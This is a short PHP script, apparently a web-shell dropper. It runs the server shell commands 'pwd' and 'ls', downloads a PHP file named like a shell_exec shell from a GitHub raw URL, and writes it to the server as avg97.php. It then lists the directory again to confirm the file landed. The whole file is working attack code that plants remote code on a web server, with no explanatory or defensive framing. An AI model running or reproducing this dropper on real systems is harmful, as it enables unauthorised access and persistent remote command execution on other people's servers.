<?= 
shell_exec('pwd') . 
'<br>--------<br>' . 
shell_exec('ls') . 
'<br>--------<br>' . 
file_put_contents("avg97.php", fopen("https://raw.githubusercontent.com/alexgoryushkin/test_shell/master/shell_exec..php", 'r')) . 
'<br>--------<br>' . 
shell_exec('ls')

?>
